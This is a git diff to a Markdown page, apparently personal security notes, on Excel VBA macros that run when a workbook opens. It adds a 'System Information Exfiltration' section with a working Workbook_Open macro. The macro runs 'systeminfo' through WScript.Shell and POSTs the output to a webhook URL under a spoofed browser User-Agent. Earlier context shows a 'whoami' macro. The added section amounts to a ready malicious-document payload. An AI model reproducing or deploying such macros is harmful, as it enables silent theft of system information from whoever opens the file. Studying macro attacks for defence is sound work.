@@ -25,7 +25,8 @@ End Sub
 
 We can use the Visual Basic code to display the name of the Desktop to the screen when macros are enabled.
 
-```cpp
+```csharp
+'Source: https://www.youtube.com/watch?v=e2icQFxhp3w'
 Sub Workbook_Open()
     Set Excel_Shell = CreateObject("WScript.Shell")
     Set Excel_Shell_Exec = Excel_Shell.Exec("whoami")
@@ -38,6 +39,24 @@ We have to copy this code under Microsoft Excel Objects in order to get it to wo
 ![On the right top we can see where the code will be edited](../.gitbook/assets/screenshot-2021-03-06-150627.png)
 
 After this you can save and exit the Excel file. When you open it again, there should be a popup with the Desktop name.
+
+### System Information Exfiltration
+
+This code is meant for Windows systems \(tested on Windows 10\), and sends the output of the "systeminfo" command on Windows to an external website, where you can read it by entering your own webhook link.
+
+```csharp
+Sub Workbook_Open()
+    Set Excel_Shell = CreateObject("WScript.Shell")
+    Set Excel_Shell_Exec = Excel_Shell.Exec("systeminfo")
+    'Source: https://stackoverflow.com/questions/158633/how-can-i-send-an-http-post-request-to-a-server-from-excel-using-vba'
+    Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP")
+    Url = "your https://webhook.site link"
+    objHTTP.Open "POST", Url, False
+    objHTTP.setRequestHeader "User-Agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)"
+    objHTTP.send ("Systeminfo: " + Excel_Shell_Exec.StdOut.ReadAll)
+End Sub
+
+```
 
 
 
